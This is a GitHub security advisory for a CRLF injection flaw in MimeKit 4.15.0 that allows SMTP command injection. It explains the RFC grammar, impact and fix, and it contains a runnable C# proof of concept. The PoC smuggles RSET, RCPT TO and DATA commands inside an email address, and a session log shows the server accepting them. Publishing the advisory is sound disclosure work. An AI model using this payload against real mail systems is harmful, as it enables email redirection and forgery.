# [M] MimeKit has CRLF Injection in Quoted Local-Part that Enables SMTP Command Injection and Email Forgery

## Summary
Severity: Medium
Advisory: GHSA-g7hc-96xr-gvvx
CVE: CVE-2026-30227
CWE: CWE-93
Ecosystem: NuGet
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-g7hc-96xr-gvvx
Type: github-advisory

## Affected
- NuGet: `MimeKit` — affected >=0 <4.15.1

## Details
### Summary
A CRLF Injection vulnerability in MimeKit 4.15.0 allows an attacker to embed `\r\n` into the SMTP envelope address local-part (when the local-part is a quoted-string). This is non-compliant with RFC 5321 and can result in SMTP command injection (e.g., injecting additional `RCPT TO` / `DATA` / `RSET` commands) and/or mail header injection, depending on how the application uses MailKit/MimeKit to construct and send messages. The issue becomes exploitable when the attacker can influence a `MailboxAddress` (MAIL FROM / RCPT TO) value that is later serialized to an SMTP session.

RFC 5321 explicitly defines the SMTP mailbox local-part grammar and does not permit CR (13) or LF (10) inside `Quoted-string` (qtextSMTP and quoted-pairSMTP ranges exclude control characters). SMTP commands are terminated by `<CRLF>`, making CRLF injection in command arguments particularly dangerous.

### Details

#### 1) RFC 5321 local-part grammar prohibits CR/LF in quoted-string

RFC 5321 defines:

```text
mail = "MAIL FROM:" Reverse-path [SP Mail-parameters] CRLF

Reverse-path = Path / "<>"
Path         = "<" [ A-d-l ":" ] Mailbox ">"
A-d-l        = At-domain *( "," At-domain )
At-domain    = "@" Domain

Mailbox         = Local-part "@" ( Domain / address-literal )
Local-part      = Dot-string / Quoted-string

Dot-string      = Atom *("." Atom)
Atom            = 1*atext
atext = ALPHA / DIGIT / 
        "!" / "#" / "$" / "%" / "&" / "'" / "*" / "+" / "-" / "/" / 
        "=" / "?" / "^" / "_" / "`" / "{" / "|" / "}" / "~"


Quoted-string   = DQUOTE *QcontentSMTP DQUOTE
QcontentSMTP    = qtextSMTP / quoted-pairSMTP
quoted-pairSMTP = %d92 %d32-126
qtextSMTP       = %d32-33 / %d35-91 / %d93-126
```

When the local part is a quoted string, the characters <CR> and <LF> are not allowed.

#### 2) MimeKit 4.15.0 accepts CR/LF inside quoted local-part (non-compliant)

In the MimeKit 4.15.0 version, when parsing the local part, the <CR> and <LF> characters in the double-quoted form will not be detected.
As a result, `MailboxAddress` can accept addresses like `"attacker\r\nRCPT TO:<victim@target>\r\n"@example.com` as a valid address.

#### 3) Affected components / versions

- MimeKit 4.15.0 (as tested)
- MailKit 4.15.0 uses/depends on MimeKit 4.15.0
Any application that:
- Accepts untrusted input for sender/recipient addresses, and
- Constructs `MailboxAddress` from that input, and
- Sends via SMTP (e.g., using MailKit SmtpClient),
may be impacted.

### PoC

Environment:
- .NET SDK: 8.0.418
- Target Framework: net8.0
- Packages: MailKit 4.15.0 (with MimeKit 4.15.0)
- Use ProtocolLogger to capture the SMTP session and confirm injection.

1) Create a minimal project:

mimekit_poc.csproj
```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="MailKit" Version="4.15.0" />
  </ItemGroup>
</Project>
````

2. PoC program (replace SMTP host/port/address as needed):

```csharp
using MailKit.Net.Smtp;
using MailKit.Security;
using MailKit;
using MimeKit;

// === payload and target setting ===

var smtpHost = "xx.xx.xx.xx";
var smtpPort = 25;
var useTls = false;
// attack in `MAIL FROM` cmd with address grammar in double quote 
var payloadEvilMailFromInput = "\"attack\r\nRSET\r\nMAIL FROM:<kc1zs4@poc.send.com>\r\nRCPT TO:<xxx@xxx.xxx.xxx.xxx>\r\nDATA\r\n.\r\nQUIT\r\nhere\"@poc.send.com";
// log in log/smtp_log_{yyyyMMdd_HHmmss_fff}.txt
var logDir = Path.Combine(AppContext.BaseDirectory, "log");
Directory.CreateDirectory(logDir);
var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss_fff");
var logPath = Path.Combine(logDir, $"smtp_log_{timestamp}");


// === below smtp session ===
// mimekit api

var envelopeFrom = new MailboxAddress("", payloadEvilMailFromInput);
var envelopeRcpt = new MailboxAddress("", "\"kc1zs4\"@poc.recv.com");
var headerFrom = new MailboxAddress("Sender", "kc1zs4@poc.send.com");
var headerTo = new MailboxAddress("Recipient", "kc1zs4@poc.recv.com");

var message = new MimeMessage();
message.From.Add(headerFrom);
message.To.Add(headerTo);
message.Subject = "mimekit CRLF injection poc";
message.Body = new TextPart("plain") { Text = "Hello from MimeKit 4.15.0" };

try {
    using var protocolLogger = new ProtocolLogger(logPath);
    using var client = new SmtpClient(protocolLogger);

    var socketOption = useTls ? SecureSocketOptions.StartTls : SecureSocketOptions.None;
    client.Connect(smtpHost, smtpPort, socketOption);

    client.Send(FormatOptions.Default, message, envelopeFrom, new[] { envelopeRcpt });
    client.Disconnect(true);

    Console.WriteLine("[+] successfully send mail");
    Console.WriteLine($"[+] view smtp session log at: {logPath}");

} catch (SmtpCommandException ex) {

    Console.Error.WriteLine($"[!] smtp cmd err: {ex.StatusCode} - {ex.Message}");
    Console.Error.WriteLine($"[!] view smtp session log at: {logPath}");
    Environment.ExitCode = 1;

} catch (SmtpProtocolException ex) {

    Console.Error.WriteLine($"[!] smtp protocol err: {ex.Message}");
    Console.Error.WriteLine($"[!] view smtp session log at: {logPath}");
    Environment.ExitCode = 1;

} catch (Exception ex) {

    Console.Error.WriteLine($"[!] unknown err: {ex.Message}");
    Console.Error.WriteLine($"[!] view smtp session log at: {logPath}");
    Environment.ExitCode = 1;
}
```

3. Expected result

* `MailboxAddress` accepts the injected addr-spec containing CRLF inside the quoted local-part because it relies on quoted-string skipping that does not reject CR/LF.
* The generated SMTP session (captured by ProtocolLogger) shows the `MAIL FROM` line being split by the injected CRLF, followed by attacker-controlled SMTP commands.
* `tcpdump` also shows the same raw SMTP stream (optional confirmation).

Example (illustrative) excerpt from smtp session log showing the CRLF injection effect:

```txt
Connected to smtp://xxx.xxx.xxx.xxx:25/
S: 220 xxx Axigen ESMTP ready
C: EHLO KC1zs4-TPt14p
S: 250-xxx Axigen ESMTP hello
S: 250-PIPELINING
S: 250-AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 GSSAPI
S: 250-AUTH=PLAIN LOGIN CRAM-MD5 DIGEST-MD5 GSSAPI
S: 250-8BITMIME
S: 250-SIZE 10485760
S: 250-HELP
S: 250 OK
C: MAIL FROM:<"attack
C: RSET
C: MAIL FROM:<kc1zs4@poc.send.com>
C: RCPT TO:<xxx@xxx.xxx.xxx.xxx>
C: DATA
C: .
C: QUIT
C: here"@poc.send.com> SIZE=293
C: RCPT TO:<"kc1zs4"@poc.recv.com>
S: 553 Invalid mail address
S: 250 Reset done
S: 250 Sender accepted
S: 250 Recipient accepted
S: 354 Ready to receive data; remember <CRLF>.<CRLF>
S: 250 Mail queued for delivery
S: 221-xxx Axigen ESMTP is closing connection
S: 221 Good bye
C: RSET
```

Notes:

* Whether the server executes the injected commands depends on server-side parsing/validation and SMTP pipeline state, but the client-side behavior (emitting CRLF into SMTP command stream via `MailboxAddress`) is sufficient to demonstrate the vulnerability class and protocol non-compliance.
* SMTP commands are terminated by `<CRLF>`, so CRLF-in-argument is structurally hazardous by design.

### Impact

Vulnerability class:

* SMTP command injection / CRLF injection via envelope address (MAIL FROM / RCPT TO).
* Protocol non-compliance with RFC 5321 local-part grammar for quoted-string (CR/LF not allowed).

Who is impacted:

* Any application using MimeKit/MailKit to send email over SMTP where mailbox addresses are influenced by untrusted input (e.g., user-supplied “From” address, tenant-configurable sender identity, inbound-to-outbound forwarding rules, contact imports, webhook-driven mail sending, etc.).

Potential consequences:

* Add or modify SMTP recipients by injecting extra `RCPT TO` commands (mail redirection / data exfiltration).
* Corrupt the SMTP transaction state (`RSET`, `NOOP`, etc.) or attempt early `DATA` injection (server-dependent).
* In some environments, may enable header injection if the attacker can pivot from envelope manipulation into message content workflows (application-dependent).
* Logging/auditing evasion or misleading audit trails if the SMTP transcript is altered by injected command boundaries.

Suggested remediation (high level):

* Reject `\r` and `\n` in local-part (and ideally anywhere) when parsing/constructing mailbox addresses used for SMTP envelopes.
* Align quoted local-part parsing with RFC 5321’s `qtextSMTP` and `quoted-pairSMTP` ranges (no control characters).

## References
- https://github.com/jstedfast/MimeKit/security/advisories/GHSA-g7hc-96xr-gvvx
- https://nvd.nist.gov/vuln/detail/CVE-2026-30227
- https://github.com/jstedfast/MimeKit
